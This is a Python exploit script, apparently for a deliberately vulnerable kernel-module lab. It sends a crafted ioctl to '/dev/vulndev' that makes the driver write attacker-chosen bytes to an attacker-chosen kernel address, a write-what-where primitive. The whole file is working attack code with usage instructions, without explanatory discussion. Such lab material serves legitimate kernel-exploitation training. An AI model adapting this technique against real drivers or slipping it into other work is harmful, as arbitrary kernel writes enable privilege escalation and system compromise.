#!/usr/bin/env python3
import fcntl
import struct
import sys
import ctypes
import os

# The IOCTL command as defined in vulndev.c
# _IOW('v', 0x01, struct aw_struct *)
# For a 64-bit system, the value should be computed as:
#   _IOC(_IOC_WRITE, 'v', 0x01, sizeof(struct aw_struct))
# We'll use a pre-calculated value here; note that this value might need adjustment based on your architecture.
VULN_IOCTL_WRITE = 0x40187601

print("[*] VULN_IOCTL_WRITE:", hex(VULN_IOCTL_WRITE))

# Our vulnerable structure: three 8-byte fields: where, what, and len.
payload_struct_format = "QQQ"  # Q = unsigned long long (8 bytes on 64-bit)

def main():
    if len(sys.argv) != 4:
        print("Usage: {} <target_address_in_hex> <data_string> <repeat_count>".format(sys.argv[0]))
        sys.exit(1)
    
    # Parse arguments
    target_addr = int(sys.argv[1], 16)
    data_str = sys.argv[2]
    repeat_count = int(sys.argv[3])
    
    # Construct data to write (repeating the string for demonstration)
    data = (data_str * repeat_count).encode()
    data_length = len(data)
    
    # Allocate a buffer for the data using ctypes to get its address reliably.
    buf = ctypes.create_string_buffer(data)
    data_addr = ctypes.addressof(buf)
    
    print(f"[*] Prepared payload: Writing {data_length} bytes to {hex(target_addr)}")
    print(f"[*] Data to write (hex): {data.hex()}")

    # Pack the payload: target address, address of data, and length.
    payload = struct.pack(payload_struct_format, target_addr, data_addr, data_length)
    
    # Open the vulnerable device.
    try:
        with open("/dev/vulndev", "rb+", buffering=0) as dev:
            print("[*] Sending payload via ioctl...")
            fcntl.ioctl(dev, VULN_IOCTL_WRITE, payload)
            print("[*] Payload sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send payload: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
